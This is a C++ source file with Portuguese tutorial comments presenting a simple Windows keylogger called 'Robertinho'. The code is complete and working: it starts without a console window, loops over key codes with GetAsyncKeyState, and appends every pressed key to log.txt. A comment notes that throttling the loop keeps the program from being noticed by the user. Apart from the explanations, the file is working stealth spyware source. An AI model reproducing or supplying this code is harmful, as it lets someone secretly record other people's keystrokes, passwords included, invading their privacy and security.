/*
	
	Robertinho funciona de maneira muito simples:

	Ele possui um loop que constatemente verifica o estado das teclas no teclado,
	caso ele verifique alguma tecla pressionada, ent�o a escreve em um log.

	Esse programa � apenas para entendimento. O Robertinho original � ligeiramente 
	diferente em pr� de uma melhor performance;

*/


// A bibliotecas essenciais para o funcionamento s�o:

#include <Windows.h>	/*	Essa biblioteca serve para a intera��o com o sistema windows,
							ela oferece os recursos essenciais como a verifica��o do estado das teclas */

#include <iostream>		//	iostream � nescessaria pois a proxima biblioteca � dependente desta

#include <fstream>		/*	Essa outra biblioteca serve para interagir com arquivos externos, podendo
							criar, modificar, ou excluir esses arquivos */

std::ofstream file;		//	Este objeto vai representar o arquivo externo

void write(int key);		/*	A Opera��o para gravar as teclas vai ser posta em uma fun��o a parte
							mas isso � preferencial e poderia muito bem estar na main

							O argumento "key" � um inteiro pois cada tecla do teclado � representada
							por um numero inteiro 

							*Obs.: Quando ao declarar uma fun��o se coloca ; significa que vc ter� que
							definir suas propriedades mais tarde
						*/




/*
	A fun��o main agora sera substituida pela fun��o WinMain

	WinMain � uma fun��o usada para criar janelas no Windows, porem nenhuma
	janela ser� criada.

	Ela inicializa o programa sem iniciar o console
*/
int CALLBACK WinMain(			
	HINSTANCE	hInstance,
	HINSTANCE	hPrevInstance,
	LPSTR		lpCmdLine,
	int			nCmdShow
)
{

	while (true) // loop infinito
	{
		for (int key = 8; key < 190; key++) // loop que passa pelo codigo de cada tecla comum do teclado
			if(GetAsyncKeyState(key))		// caso a tecla esteja pressionada, a fun��o write key � chamada
				write(key);					// recebendo como argumento o codigo da tecla pressionada

		Sleep(1000 / 6);	/*	Sleep � uma fun��o que serve para pausar o programa
								sem essa fun��o, o programa usaria o maximo do processador
								e ficaria evidente ao usuario

								Alem disso ela evita que teclas sejam repetidas constantemente a cada
								volta que o loop der e perceber que a tecla continua pressionada
							*/
	}

}

void write(int key)		//	A defini��o do que a fun��o "write" j� declarada anteriormente ir� fazer
{
	file.open("log.txt", std::fstream::app);	/*	a fun��o open abre um arquivo que caso n�o exista sera gerado
													ela recebe 2 argumentos. O primeiro � o nome do arquivo, e o segundo
													� a forma de tratar este arquvio.
												*/

	file << key;	// Com isso as teclas ser�o gravadas no arquivo sem nenhum polimento

	file.close();	// O arquivo deve ser fechado sempre que for aberto
}
